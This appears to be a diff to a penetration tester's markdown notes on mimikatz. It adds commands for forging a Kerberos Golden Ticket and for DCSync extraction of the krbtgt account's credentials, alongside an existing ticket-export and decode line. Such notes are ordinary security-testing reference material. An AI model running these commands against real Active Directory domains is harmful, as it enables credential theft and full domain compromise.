@@ -59,3 +59,26 @@ mimikatz# kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
 
 📚 See also: [pypykatz](pypykatz.md) for Linux users.
 </div></div>
+
+<hr class="sep-both">
+
+## 👻 To-do 👻
+
+Stuff that I found, but never read/used yet.
+
+<div class="row row-cols-lg-2"><div>
+
+Golden ticket (Admin not required)
+
+```shell!
+mimikatz# kerberos::golden /user:dummy /domain:dev.example.com /sid:<child domain SID> /krbtgt:<hash> /sids:<target domain SID> /ptt
+```
+</div><div>
+
+DCSync (Admin required)
+
+```shell!
+mimikatz# lsadump::dcsync /user:example\krbtgt
+mimikatz# lsadump::dcsync /user:example\krbtgt /domain:example.com
+```
+</div></div>
